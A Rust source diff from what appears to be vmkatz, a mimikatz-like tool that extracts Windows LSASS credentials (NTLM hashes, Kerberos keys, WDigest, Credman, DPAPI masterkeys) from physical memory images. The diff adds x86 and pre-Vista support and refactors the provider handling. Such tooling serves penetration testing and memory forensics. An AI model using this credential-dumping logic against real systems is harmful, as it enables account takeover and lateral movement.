@@ -1,21 +1,344 @@
-use crate::error::{GovmemError, Result};
+use std::fmt;
+
+use crate::error::{VmkatzError, Result};
 use crate::lsass::crypto::{self, CryptoKeys};
 use crate::lsass::types::{Credential, KerberosCredential, KerberosKey, MsvCredential};
 use crate::memory::{PhysicalMemory, VirtualMemory};
-use crate::paging::translate::{PageTableWalker, ProcessMemory};
-use crate::windows::offsets::X64_LDR;
+use crate::paging::translate::{PageTableWalker, PaeProcessMemory, ProcessMemory};
+use crate::lsass::types::Arch;
+use crate::windows::offsets::{EprocessOffsets, WindowsBitness, X64_LDR};
 use crate::windows::peb::{self, LoadedModule};
 use crate::windows::process::Process;
 
+/// KUSER_SHARED_DATA.NtBuildNumber (mapped at 0x7FFE0000 in all user processes).
+const KUSER_NT_BUILD_NUMBER: u64 = 0x7FFE_0260;
+
+/// Status of an SSP provider extraction attempt.
+#[derive(Clone, Copy, PartialEq)]
+enum ProviderStatus {
+    Ok,
+    Paged,
+    Empty,
+    NotAvailable,
+}
+
+impl ProviderStatus {
+    fn from_result_empty(is_empty: bool) -> Self {
+        if is_empty { Self::Empty } else { Self::Ok }
+    }
+}
+
+impl fmt::Display for ProviderStatus {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::Ok => f.write_str("ok"),
+            Self::Paged => f.write_str("paged"),
+            Self::Empty => f.write_str("empty"),
+            Self::NotAvailable => f.write_str("n/a"),
+        }
+    }
+}
+
+use super::types::{read_u16_le, read_u32_le, read_u64_le};
+
+/// Provider status tracking for all 9 SSP providers.
+struct ProviderStatuses {
+    msv: ProviderStatus,
+    wdigest: ProviderStatus,
+    kerberos: ProviderStatus,
+    tspkg: ProviderStatus,
+    dpapi: ProviderStatus,
+    ssp: ProviderStatus,
+    livessp: ProviderStatus,
+    credman: ProviderStatus,
+    cloudap: ProviderStatus,
+}
+
+impl ProviderStatuses {
+    fn new(dlls: &LsassDlls<'_>) -> Self {
+        Self {
+            msv: ProviderStatus::Paged,
+            wdigest: ProviderStatus::Paged,
+            kerberos: ProviderStatus::Paged,
+            tspkg: ProviderStatus::Paged,
+            dpapi: ProviderStatus::Paged,
+            ssp: ProviderStatus::Empty,
+            livessp: if dlls.livessp.is_some() { ProviderStatus::Paged } else { ProviderStatus::NotAvailable },
+            credman: ProviderStatus::Paged,
+            cloudap: if dlls.cloudap.is_some() { ProviderStatus::Paged } else { ProviderStatus::NotAvailable },
+        }
+    }
+
+    fn print_summary(&self) {
+        println!(
+            "[*] Providers: MSV({}) WDigest({}) Kerberos({}) TsPkg({}) DPAPI({}) SSP({}) LiveSSP({}) Credman({}) CloudAP({})",
+            self.msv, self.wdigest, self.kerberos, self.tspkg, self.dpapi,
+            self.ssp, self.livessp, self.credman, self.cloudap,
+        );
+    }
+}
+
 /// DLLs loaded in LSASS that we need to locate.
-pub struct LsassDlls {
-    pub lsasrv: Option<LoadedModule>,
-    pub msv1_0: Option<LoadedModule>,
-    pub wdigest: Option<LoadedModule>,
-    pub kerberos: Option<LoadedModule>,
-    pub tspkg: Option<LoadedModule>,
-    pub livessp: Option<LoadedModule>,
-    pub cloudap: Option<LoadedModule>,
+pub struct LsassDlls<'a> {
+    pub lsasrv: Option<&'a LoadedModule>,
+    pub msv1_0: Option<&'a LoadedModule>,
+    pub wdigest: Option<&'a LoadedModule>,
+    pub kerberos: Option<&'a LoadedModule>,
+    pub tspkg: Option<&'a LoadedModule>,
+    pub livessp: Option<&'a LoadedModule>,
+    pub cloudap: Option<&'a LoadedModule>,
+    pub dpapisrv: Option<&'a LoadedModule>,
+}
+
+impl<'a> LsassDlls<'a> {
+    fn from_modules(modules: &'a [LoadedModule]) -> Self {
+        Self {
+            lsasrv: find_module(modules, "lsasrv.dll"),
+            msv1_0: find_module(modules, "msv1_0.dll"),
+            wdigest: find_module(modules, "wdigest.dll"),
+            kerberos: find_module(modules, "kerberos.dll"),
+            tspkg: find_module(modules, "tspkg.dll"),
+            livessp: find_module(modules, "livessp.dll"),
+            cloudap: find_module(modules, "cloudap.dll"),
+            dpapisrv: find_module(modules, "dpapisrv.dll"),
+        }
+    }
+}
+
+/// Insert MSV session metadata into the credential map.
+fn insert_sessions(
+    all_creds: &mut std::collections::HashMap<u64, Credential>,
+    sessions: Vec<crate::lsass::msv::MsvSessionInfo>,
+) {
+    for sess in sessions {
+        let luid = sess.luid;
+        all_creds.entry(luid).or_insert_with(|| {
+            let mut c = Credential::new_empty(luid, sess.username, sess.domain);
+            c.logon_type = sess.logon_type;
+            c.session_id = sess.session_id;
+            c.logon_time = sess.logon_time;
+            c.logon_server = sess.logon_server;
+            c.sid = sess.sid;
+            c
+        });
+    }
+}
+
+/// Extract credentials from the 6 "simple" providers (no fallback paths).
+/// Handles: WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP.
+fn extract_simple_providers(
+    vmem: &dyn VirtualMemory,
+    dlls: &LsassDlls<'_>,
+    keys: &CryptoKeys,
+    arch: Arch,
+    all_creds: &mut std::collections::HashMap<u64, Credential>,
+    status: &mut ProviderStatuses,
+) {
+    // WDigest
+    if let Some(wd) = &dlls.wdigest {
+        match crate::lsass::wdigest::extract_wdigest_credentials_arch(vmem, wd.base, wd.size, keys, arch) {
+            Ok(creds) => {
+                status.wdigest = ProviderStatus::from_result_empty(creds.is_empty());
+                for (luid, wd_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, wd_cred.username.clone(), wd_cred.domain.clone())
+                    });
+                    entry.wdigest = Some(wd_cred);
+                }
+            }
+            Err(e) => log::info!("WDigest extraction failed: {}", e),
+        }
+    }
+
+    // TsPkg
+    if let Some(ts) = &dlls.tspkg {
+        match crate::lsass::tspkg::extract_tspkg_credentials_arch(vmem, ts.base, ts.size, keys, arch) {
+            Ok(creds) => {
+                status.tspkg = ProviderStatus::from_result_empty(creds.is_empty());
+                for (luid, ts_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, ts_cred.username.clone(), ts_cred.domain.clone())
+                    });
+                    entry.tspkg = Some(ts_cred);
+                }
+            }
+            Err(e) => log::info!("TsPkg extraction failed: {}", e),
+        }
+    }
+
+    // SSP (uses msv1_0.dll)
+    if let Some(msv) = &dlls.msv1_0 {
+        match crate::lsass::ssp::extract_ssp_credentials_arch(vmem, msv.base, msv.size, keys, arch) {
+            Ok(creds) => {
+                status.ssp = ProviderStatus::from_result_empty(creds.is_empty());
+                for (luid, ssp_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, ssp_cred.username.clone(), ssp_cred.domain.clone())
+                    });
+                    entry.ssp = Some(ssp_cred);
+                }
+            }
+            Err(e) => log::debug!("SSP extraction: {}", e),
+        }
+    }
+
+    // LiveSSP
+    if let Some(live) = &dlls.livessp {
+        match crate::lsass::livessp::extract_livessp_credentials_arch(vmem, live.base, live.size, keys, arch) {
+            Ok(creds) => {
+                status.livessp = ProviderStatus::from_result_empty(creds.is_empty());
+                for (luid, live_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, live_cred.username.clone(), live_cred.domain.clone())
+                    });
+                    entry.livessp = Some(live_cred);
+                }
+            }
+            Err(e) => log::info!("LiveSSP extraction failed: {}", e),
+        }
+    }
+
+    // Credman (uses msv1_0.dll)
+    if let Some(msv) = &dlls.msv1_0 {
+        match crate::lsass::credman::extract_credman_credentials_arch(vmem, msv.base, msv.size, keys, arch) {
+            Ok(creds) => {
+                status.credman = ProviderStatus::from_result_empty(creds.is_empty());
+                for (luid, cm_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, cm_cred.username.clone(), cm_cred.domain.clone())
+                    });
+                    entry.credman.push(cm_cred);
+                }
+            }
+            Err(e) => log::info!("Credman extraction failed: {}", e),
+        }
+    }
+
+    // CloudAP
+    if let Some(cap) = &dlls.cloudap {
+        match crate::lsass::cloudap::extract_cloudap_credentials_arch(vmem, cap.base, cap.size, keys, arch) {
+            Ok(creds) => {
+                status.cloudap = ProviderStatus::from_result_empty(creds.is_empty());
+                for (luid, cap_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, cap_cred.username.clone(), cap_cred.domain.clone())
+                    });
+                    entry.cloudap = Some(cap_cred);
+                }
+            }
+            Err(e) => log::info!("CloudAP extraction failed: {}", e),
+        }
+    }
+}
+
+/// Extract DPAPI credentials from DLLs (lsasrv first, then dpapisrv fallback).
+fn extract_dpapi_from_dlls(
+    vmem: &dyn VirtualMemory,
+    lsasrv: &LoadedModule,
+    dpapisrv: Option<&LoadedModule>,
+    keys: &CryptoKeys,
+    arch: Arch,
+) -> Vec<(u64, crate::lsass::types::DpapiCredential)> {
+    let dpapi_dlls: Vec<(&str, u64, u32)> = [
+        Some(("lsasrv.dll", lsasrv.base, lsasrv.size)),
+        dpapisrv.map(|d| ("dpapisrv.dll", d.base, d.size)),
+    ]
+    .into_iter()
+    .flatten()
+    .collect();
+
+    for (dll_name, dll_base, dll_size) in &dpapi_dlls {
+        match crate::lsass::dpapi::extract_dpapi_credentials_arch(vmem, *dll_base, *dll_size, keys, arch) {
+            Ok(creds) if !creds.is_empty() => {
+                log::info!("DPAPI: found {} masterkeys in {}", creds.len(), dll_name);
+                return creds;
+            }
+            Ok(_) => log::info!("DPAPI: {} returned empty", dll_name),
+            Err(e) => log::info!("DPAPI extraction from {} failed: {}", dll_name, e),
+        }
+    }
+    Vec::new()
+}
+
+/// Insert DPAPI credentials into the credential map.
+fn insert_dpapi_creds(
+    all_creds: &mut std::collections::HashMap<u64, Credential>,
+    dpapi_creds: Vec<(u64, crate::lsass::types::DpapiCredential)>,
+) {
+    for (luid, dpapi_cred) in dpapi_creds {
+        let entry = all_creds
+            .entry(luid)
+            .or_insert_with(|| Credential::new_empty(luid, String::new(), String::new()));
+        entry.dpapi.push(dpapi_cred);
+    }
+}
+
+/// Assign Kerberos key groups to credentials by matching RC4 keys to NT hashes.
+fn assign_kerberos_key_groups(
+    all_creds: &mut std::collections::HashMap<u64, Credential>,
+    key_groups: Vec<Vec<KerberosKey>>,
+) {
+    let nt_to_luid: Vec<([u8; 16], u64)> = all_creds
+        .iter()
+        .filter_map(|(&luid, c)| c.msv.as_ref().map(|m| (m.nt_hash, luid)))
+        .collect();
+
+    let mut unassigned: Vec<Vec<KerberosKey>> = Vec::new();
+
+    for key_group in key_groups {
+        let rc4_match = key_group.iter().find(|k| k.etype == 23).and_then(|k| {
+            if k.key.len() == 16 {
+                let mut hash = [0u8; 16];
+                hash.copy_from_slice(&k.key);
+                nt_to_luid.iter().find(|(h, _)| *h == hash).map(|(_, luid)| *luid)
+            } else {
+                None
+            }
+        });
+
+        if let Some(luid) = rc4_match {
+            if let Some(cred) = all_creds.get_mut(&luid) {
+                if cred.kerberos.is_none() {
+                    cred.kerberos = Some(KerberosCredential {
+                        username: cred.username.clone(),
+                        domain: cred.domain.clone(),
+                        password: String::new(),
+                        keys: key_group,
+                        tickets: Vec::new(),
+                    });
+                } else if let Some(krb) = &mut cred.kerberos {
+                    if krb.keys.is_empty() {
+                        krb.keys = key_group;
+                    }
+                }
+                continue;
+            }
+        }
+        unassigned.push(key_group);
+    }
+
+    for key_group in unassigned {
+        let target = all_creds.values_mut().find(|c| {
+            c.kerberos.as_ref().is_some_and(|k| k.keys.is_empty())
+        });
+        if let Some(cred) = target {
+            if let Some(krb) = &mut cred.kerberos {
+                krb.keys = key_group;
+            }
+        }
+    }
+}
+
+/// Fill well-known LUID names, sort by LUID.
+fn finalize_credentials(
+    mut all_creds: std::collections::HashMap<u64, Credential>,
+) -> Vec<Credential> {
+    for cred in all_creds.values_mut() {
+        crate::lsass::types::fill_wellknown_luid(cred);
+    }
+    let mut result: Vec<Credential> = all_creds.into_values().collect();
+    result.sort_by_key(|c| c.luid);
+    result
 }
 
 /// Pagefile reference type: wraps Option<&PagefileReader> when sam feature is enabled,
@@ -31,6 +354,213 @@ pub type PagefileRef<'a> = ();
 pub type DiskPathRef<'a> = Option<&'a std::path::Path>;
 #[cfg(not(feature = "sam"))]
 pub type DiskPathRef<'a> = ();
+
+/// Bitness-aware credential extraction: dispatches to x64, Win10 x86, or pre-Vista x86.
+pub fn extract_all_credentials_auto<P: PhysicalMemory>(
+    phys: &P,
+    lsass: &Process,
+    kernel_dtb: u64,
+    offsets: &EprocessOffsets,
+    pagefile: PagefileRef<'_>,
+    disk_path: DiskPathRef<'_>,
+) -> Result<Vec<Credential>> {
+    match offsets.bitness {
+        WindowsBitness::X64 => {
+            extract_all_credentials(phys, lsass, kernel_dtb, pagefile, disk_path)
+        }
+        WindowsBitness::X86Pae => {
+            if is_prevista_x86(offsets) {
+                extract_prevista_credentials(phys, lsass)
+            } else {
+                extract_all_credentials_x86(phys, lsass)
+            }
+        }
+    }
+}
+
+/// Determine if x86 EPROCESS offsets correspond to pre-Vista (WinXP/Win2003).
+/// Pre-Vista x86 has PID at 0x84 (WinXP) or 0x94 (Win2003), Win10 x86 has PID >= 0xB4.
+fn is_prevista_x86(offsets: &EprocessOffsets) -> bool {
+    offsets.unique_process_id < 0xA0
+}
+
+/// Extract credentials from a pre-Vista 32-bit LSASS process.
+/// Uses PAE page table walking and pre-Vista crypto (DES-X-CBC / RC4).
+fn extract_prevista_credentials<P: PhysicalMemory>(
+    phys: &P,
+    lsass: &Process,
+) -> Result<Vec<Credential>> {
+    log::info!(
+        "Pre-Vista LSASS: PID={}, DTB=0x{:x}, PEB=0x{:x}",
+        lsass.pid, lsass.dtb, lsass.peb_vaddr
+    );
+
+    // Create 32-bit PAE virtual memory reader
+    let vmem = PaeProcessMemory::new(phys, lsass.dtb);
+
+    // Enumerate 32-bit DLLs
+    let ldr_offsets = peb::X86_LDR;
+    let modules = peb::enumerate_modules_32(&vmem, lsass.peb_vaddr, &ldr_offsets)?;
+
+    log::info!("Pre-Vista LSASS: {} modules loaded", modules.len());
+    for m in &modules {
+        log::debug!("  0x{:08x} ({:8} bytes) {}", m.base, m.size, m.base_name);
+    }
+
+    // Find lsasrv.dll and msv1_0.dll
+    let lsasrv = find_module(&modules, "lsasrv.dll");
+    let msv1_0 = find_module(&modules, "msv1_0.dll");
+
+    let lsasrv = lsasrv.ok_or_else(|| {
+        VmkatzError::PatternNotFound("lsasrv.dll not found in pre-Vista LSASS".to_string())
+    })?;
+
+    // Extract pre-Vista crypto keys from lsasrv.dll
+    let keys = crypto::extract_prevista_crypto_keys(&vmem, lsasrv.base, lsasrv.size as u64)?;
+    println!("[+] Pre-Vista crypto keys extracted (DES-X + RC4)");
+
+    let mut credentials = Vec::new();
+
+    // MSV1_0: Extract NTLM hashes
+    if let Some(msv) = msv1_0 {
+        match crate::lsass::msv::extract_prevista_msv_credentials(
+            &vmem, msv.base, msv.size as u64, &keys,
+        ) {
+            Ok(msv_creds) => {
+                println!("[+] Pre-Vista MSV: {} credential(s) extracted", msv_creds.len());
+                for (luid, msv_cred) in msv_creds {
+                    let mut cred = Credential::new_empty(
+                        luid,
+                        msv_cred.username.clone(),
+                        msv_cred.domain.clone(),
+                    );
+                    cred.msv = Some(msv_cred);
+                    credentials.push(cred);
+                }
+            }
+            Err(e) => {
+                log::warn!("Pre-Vista MSV extraction failed: {}", e);
+                println!("[-] Pre-Vista MSV: {}", e);
+            }
+        }
+    } else {
+        println!("[-] msv1_0.dll not found in pre-Vista LSASS");
+    }
+
+    // Pre-Vista has no DPAPI/TsPkg/CloudAP/SSP/LiveSSP/Credman in LSASS
+    // WDigest + Kerberos: deferred to follow-up (different pre-Vista structures)
+    if credentials.is_empty() {
+        println!("[*] Pre-Vista: no credentials extracted (WDigest/Kerberos not yet supported)");
+    }
+
+    Ok(credentials)
+}
+
+/// Extract credentials from a Win10 x86 LSASS process.
+/// Uses PAE page table walking with Vista+ AES/3DES crypto and all SSP providers.
+fn extract_all_credentials_x86<P: PhysicalMemory>(
+    phys: &P,
+    lsass: &Process,
+) -> Result<Vec<Credential>> {
+    log::info!(
+        "Win10 x86 LSASS: PID={}, DTB=0x{:x}, PEB=0x{:x}",
+        lsass.pid, lsass.dtb, lsass.peb_vaddr
+    );
+
+    let arch = Arch::X86;
+
+    // Create 32-bit PAE virtual memory reader
+    let vmem = PaeProcessMemory::new(phys, lsass.dtb);
+
+    // Enumerate 32-bit DLLs
+    let ldr_offsets = peb::X86_LDR;
+    let modules = peb::enumerate_modules_32(&vmem, lsass.peb_vaddr, &ldr_offsets)?;
+
+    log::info!("Win10 x86 LSASS: {} modules loaded", modules.len());
+    for m in &modules {
+        log::debug!("  0x{:08x} ({:8} bytes) {}", m.base, m.size, m.base_name);
+    }
+
+    let dlls = LsassDlls::from_modules(&modules);
+
+    let lsasrv = dlls
+        .lsasrv
+        .ok_or_else(|| VmkatzError::ProcessNotFound("lsasrv.dll not found in x86 LSASS".to_string()))?;
+
+    // Read Windows build number from KUSER_SHARED_DATA (0x7FFE0000 on x86 too)
+    let build_number = vmem
+        .read_virt_u32(KUSER_NT_BUILD_NUMBER)
+        .map(|v| v & 0xFFFF)
+        .unwrap_or(0);
+    log::info!("Windows x86 build number: {}", build_number);
+
+    // Extract Vista+ crypto keys (AES/3DES) — same algorithm, x86 patterns
+    let keys = crypto::extract_crypto_keys_x86(&vmem, lsasrv.base, lsasrv.size)?;
+
+    let mut all_creds: std::collections::HashMap<u64, Credential> =
+        std::collections::HashMap::new();
+    let mut status = ProviderStatuses::new(&dlls);
+
+    // MSV sessions + credentials
+    if let Some(msv) = &dlls.msv1_0 {
+        let mut sessions = crate::lsass::msv::extract_msv_sessions_arch(&vmem, msv.base, msv.size, build_number, arch);
+        log::info!("MSV x86 sessions discovered: {}", sessions.len());
+        if let Some(lsasrv_mod) = dlls.lsasrv {
+            crate::lsass::msv::enrich_sessions_from_lsasrv(
+                &vmem, lsasrv_mod.base, lsasrv_mod.size, &mut sessions, arch,
+            );
+        }
+        insert_sessions(&mut all_creds, sessions);
+
+        match crate::lsass::msv::extract_msv_credentials_arch(
+            &vmem, msv.base, msv.size, &keys, build_number, arch,
+        ) {
+            Ok(msv_creds) => {
+                status.msv = ProviderStatus::from_result_empty(msv_creds.is_empty());
+                for (luid, msv_cred) in msv_creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, msv_cred.username.clone(), msv_cred.domain.clone())
+                    });
+                    entry.msv = Some(msv_cred);
+                }
+            }
+            Err(e) => log::info!("MSV x86 extraction failed: {}", e),
+        }
+    }
+
+    // Simple providers (WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP)
+    extract_simple_providers(&vmem, &dlls, &keys, arch, &mut all_creds, &mut status);
+
+    // Kerberos
+    if let Some(krb) = &dlls.kerberos {
+        match crate::lsass::kerberos::extract_kerberos_credentials_arch(
+            &vmem, krb.base, krb.size, &keys, arch,
+        ) {
+            Ok(creds) => {
+                status.kerberos = ProviderStatus::from_result_empty(creds.is_empty());
+                for (luid, krb_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, krb_cred.username.clone(), krb_cred.domain.clone())
+                    });
+                    entry.kerberos = Some(krb_cred);
+                }
+            }
+            Err(e) => log::info!("Kerberos x86 extraction failed: {}", e),
+        }
+    }
+
+    // DPAPI (DLL chain + physical scan fallback)
+    let mut dpapi_creds = extract_dpapi_from_dlls(&vmem, lsasrv, dlls.dpapisrv, &keys, arch);
+    if dpapi_creds.is_empty() {
+        log::info!("DPAPI x86: standard extraction found nothing, trying physical scan...");
+        dpapi_creds = crate::lsass::dpapi::extract_dpapi_physical_scan_x86(phys, lsass.dtb, &vmem, &keys);
+    }
+    status.dpapi = ProviderStatus::from_result_empty(dpapi_creds.is_empty());
+    insert_dpapi_creds(&mut all_creds, dpapi_creds);
+
+    status.print_summary();
+    Ok(finalize_credentials(all_creds))
+}
 
 /// Find LSASS and extract all credentials.
 /// When a pagefile reader is provided, paged-out memory is resolved from disk.
@@ -97,25 +627,16 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
     #[cfg(not(feature = "sam"))]
     let lsass_vmem = lsass_vmem_init;
 
-    let dlls = LsassDlls {
-        lsasrv: find_module(&modules, "lsasrv.dll"),
-        msv1_0: find_module(&modules, "msv1_0.dll"),
-        wdigest: find_module(&modules, "wdigest.dll"),
-        kerberos: find_module(&modules, "kerberos.dll"),
-        tspkg: find_module(&modules, "tspkg.dll"),
-        livessp: find_module(&modules, "livessp.dll"),
-        cloudap: find_module(&modules, "cloudap.dll"),
-    };
+    let dlls = LsassDlls::from_modules(&modules);
 
     // Extract crypto keys from lsasrv.dll
     let lsasrv = dlls
         .lsasrv
-        .as_ref()
-        .ok_or_else(|| GovmemError::ProcessNotFound("lsasrv.dll not found in LSASS".to_string()))?;
+        .ok_or_else(|| VmkatzError::ProcessNotFound("lsasrv.dll not found in LSASS".to_string()))?;
 
     // Read Windows build number from KUSER_SHARED_DATA (always at VA 0x7FFE0000)
     let build_number = lsass_vmem
-        .read_virt_u32(0x7FFE0260)
+        .read_virt_u32(KUSER_NT_BUILD_NUMBER)
         .map(|v| v & 0xFFFF) // Low 16 bits = build number
         .unwrap_or(0);
     log::info!("Windows build number: {}", build_number);
@@ -135,92 +656,47 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
         }
     };
 
-    // Extract credentials from each provider, tracking status for summary
     let mut all_creds: std::collections::HashMap<u64, Credential> =
         std::collections::HashMap::new();
+    let mut status = ProviderStatuses::new(&dlls);
 
-    // First: discover all logon sessions from MSV list walk (even without credentials)
+    // MSV sessions + enrichment
     if let Some(msv) = &dlls.msv1_0 {
-        let sessions = crate::lsass::msv::extract_msv_sessions(&lsass_vmem, msv.base, msv.size);
+        let mut sessions = crate::lsass::msv::extract_msv_sessions_arch(&lsass_vmem, msv.base, msv.size, build_number, Arch::X64);
         log::info!("MSV sessions discovered: {}", sessions.len());
-        for sess in sessions {
-            all_creds.entry(sess.luid).or_insert_with(|| {
-                let mut c =
-                    Credential::new_empty(sess.luid, sess.username.clone(), sess.domain.clone());
-                c.logon_type = sess.logon_type;
-                c.session_id = sess.session_id;
-                c.logon_time = sess.logon_time;
-                c.logon_server = sess.logon_server.clone();
-                c.sid = sess.sid.clone();
-                c
-            });
+        if let Some(lsasrv_ref) = dlls.lsasrv {
+            crate::lsass::msv::enrich_sessions_from_lsasrv(
+                &lsass_vmem, lsasrv_ref.base, lsasrv_ref.size, &mut sessions, Arch::X64,
+            );
         }
+        insert_sessions(&mut all_creds, sessions);
     }
 
-    // Provider status: "ok", "paged", "empty", "n/a"
-    let mut msv_status = "paged";
-    let mut wdigest_status = "paged";
-    let mut kerberos_status = "paged";
-    let mut tspkg_status = "paged";
-    let mut ssp_status = "empty";
-    let mut livessp_status = if dlls.livessp.is_some() {
-        "paged"
-    } else {
-        "n/a"
-    };
-    let mut credman_status = "paged";
-    let mut cloudap_status = if dlls.cloudap.is_some() {
-        "paged"
-    } else {
-        "n/a"
-    };
-
-    // MSV1_0
+    // MSV credentials (with physical scan fallback)
     if let Some(msv) = &dlls.msv1_0 {
-        let msv_creds = match crate::lsass::msv::extract_msv_credentials(
-            &lsass_vmem,
-            msv.base,
-            msv.size,
-            &keys,
+        let msv_creds = match crate::lsass::msv::extract_msv_credentials_arch(
+            &lsass_vmem, msv.base, msv.size, &keys, build_number, Arch::X64,
         ) {
             Ok(creds) if !creds.is_empty() => creds,
             Ok(_) => {
-                // Standard extraction found nothing, try physical memory scan
                 log::info!("MSV: Standard extraction found nothing, trying physical LUID scan...");
-                scan_phys_for_msv_credentials(
-                    phys,
-                    lsass.dtb,
-                    &lsass_vmem,
-                    msv.base,
-                    msv.size,
-                    &keys,
-                )
+                scan_phys_for_msv_credentials(phys, lsass.dtb, &lsass_vmem, msv.base, msv.size, &keys)
             }
             Err(e) => {
                 log::info!("MSV extraction failed: {}, trying physical scan...", e);
-                scan_phys_for_msv_credentials(
-                    phys,
-                    lsass.dtb,
-                    &lsass_vmem,
-                    msv.base,
-                    msv.size,
-                    &keys,
-                )
+                scan_phys_for_msv_credentials(phys, lsass.dtb, &lsass_vmem, msv.base, msv.size, &keys)
             }
         };
         if !msv_creds.is_empty() {
-            msv_status = "ok";
+            status.msv = ProviderStatus::Ok;
         }
         let mut next_synth_luid = 0x8000_0000_0000_0000u64;
         for (luid, msv_cred) in msv_creds {
-            // When physical scan returns LUID=0, match by username+domain to existing session.
-            // If domain is empty or "." (local machine shorthand), match by username only.
             let effective_luid = if luid == 0 {
                 all_creds
                     .iter()
                     .find(|(_, c)| {
-                        let name_match =
-                            c.username.eq_ignore_ascii_case(&msv_cred.username);
+                        let name_match = c.username.eq_ignore_ascii_case(&msv_cred.username);
                         let domain_match = msv_cred.domain.is_empty()
                             || msv_cred.domain == "."
                             || c.domain.eq_ignore_ascii_case(&msv_cred.domain);
@@ -236,78 +712,36 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
                 luid
             };
             let entry = all_creds.entry(effective_luid).or_insert_with(|| {
-                Credential::new_empty(
-                    effective_luid,
-                    msv_cred.username.clone(),
-                    msv_cred.domain.clone(),
-                )
+                Credential::new_empty(effective_luid, msv_cred.username.clone(), msv_cred.domain.clone())
             });
             entry.msv = Some(msv_cred);
         }
     }
 
-    // WDigest
-    if let Some(wd) = &dlls.wdigest {
-        match crate::lsass::wdigest::extract_wdigest_credentials(
-            &lsass_vmem,
-            wd.base,
-            wd.size,
-            &keys,
-        ) {
-            Ok(creds) => {
-                if creds.is_empty() {
-                    wdigest_status = "empty";
-                } else {
-                    wdigest_status = "ok";
-                }
-                for (luid, wd_cred) in creds {
-                    let entry = all_creds.entry(luid).or_insert_with(|| {
-                        Credential::new_empty(
-                            luid,
-                            wd_cred.username.clone(),
-                            wd_cred.domain.clone(),
-                        )
-                    });
-                    entry.wdigest = Some(wd_cred);
-                }
-            }
-            Err(e) => log::info!("WDigest extraction failed: {}", e),
-        }
-    }
+    // Simple providers (WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP)
+    extract_simple_providers(&lsass_vmem, &dlls, &keys, Arch::X64, &mut all_creds, &mut status);
 
-    // Kerberos
+    // Kerberos (with physical scan + key scan fallbacks)
     if let Some(krb) = &dlls.kerberos {
-        let krb_creds = match crate::lsass::kerberos::extract_kerberos_credentials(
-            &lsass_vmem,
-            krb.base,
-            krb.size,
-            &keys,
+        let krb_creds = match crate::lsass::kerberos::extract_kerberos_credentials_arch(
+            &lsass_vmem, krb.base, krb.size, &keys, Arch::X64,
         ) {
             Ok(creds) if !creds.is_empty() => creds,
             Ok(_) | Err(_) => {
                 log::info!("Kerberos: AVL table walk found nothing, trying physical scan...");
-                // Build set of known user/domain pairs from already-discovered credentials
                 let known_users: std::collections::HashSet<(String, String)> = all_creds
                     .values()
                     .map(|c| (c.username.to_lowercase(), c.domain.to_lowercase()))
                     .collect();
-                scan_phys_for_kerberos_credentials(
-                    phys,
-                    lsass.dtb,
-                    &lsass_vmem,
-                    &keys,
-                    &known_users,
-                )
+                scan_phys_for_kerberos_credentials(phys, lsass.dtb, &lsass_vmem, &keys, &known_users)
             }
         };
         if !krb_creds.is_empty() {
-            kerberos_status = "ok";
+            status.kerberos = ProviderStatus::Ok;
         }
-        // Check if any Kerberos credentials have keys
         let has_keys = krb_creds.iter().any(|(_, k)| !k.keys.is_empty());
 
         for (luid, krb_cred) in krb_creds {
-            // When physical scan returns LUID=0, match by username+domain to existing session
             let effective_luid = if luid == 0 {
                 all_creds
                     .iter()
@@ -322,247 +756,30 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
                 luid
             };
             let entry = all_creds.entry(effective_luid).or_insert_with(|| {
-                Credential::new_empty(
-                    effective_luid,
-                    krb_cred.username.clone(),
-                    krb_cred.domain.clone(),
-                )
+                Credential::new_empty(effective_luid, krb_cred.username.clone(), krb_cred.domain.clone())
             });
             entry.kerberos = Some(krb_cred);
         }
 
-        // If no keys were found via AVL walk or physical credential scan,
-        // try dedicated physical scan for KIWI_KERBEROS_KEYS_LIST_6 structures
         if !has_keys {
-            let key_groups =
-                scan_phys_for_kerberos_keys(phys, lsass.dtb, &lsass_vmem, &keys);
+            let key_groups = scan_phys_for_kerberos_keys(phys, lsass.dtb, &lsass_vmem, &keys);
             if !key_groups.is_empty() {
-                kerberos_status = "ok";
-
-                // Build NT hash → LUID mapping for RC4 key matching
-                let nt_to_luid: std::collections::HashMap<[u8; 16], u64> = all_creds
-                    .iter()
-                    .filter_map(|(&luid, c)| c.msv.as_ref().map(|m| (m.nt_hash, luid)))
-                    .collect();
-
-                let mut unassigned: Vec<Vec<KerberosKey>> = Vec::new();
-
-                for key_group in key_groups {
-                    // Try to match RC4 key (etype 23) to an NT hash
-                    let rc4_match = key_group.iter().find(|k| k.etype == 23).and_then(|k| {
-                        if k.key.len() == 16 {
-                            let mut hash = [0u8; 16];
-                            hash.copy_from_slice(&k.key);
-                            nt_to_luid.get(&hash).copied()
-                        } else {
-                            None
-                        }
-                    });
-
-                    if let Some(luid) = rc4_match {
-                        if let Some(cred) = all_creds.get_mut(&luid) {
-                            if cred.kerberos.is_none() {
-                                cred.kerberos = Some(KerberosCredential {
-                                    username: cred.username.clone(),
-                                    domain: cred.domain.clone(),
-                                    password: String::new(),
-                                    keys: key_group,
-                                    tickets: Vec::new(),
-                                });
-                            } else if let Some(krb) = &mut cred.kerberos {
-                                if krb.keys.is_empty() {
-                                    krb.keys = key_group;
-                                }
-                            }
-                            continue;
-                        }
-                    }
-                    unassigned.push(key_group);
-                }
-
-                // Remaining: assign to creds with Kerberos but no keys (best effort)
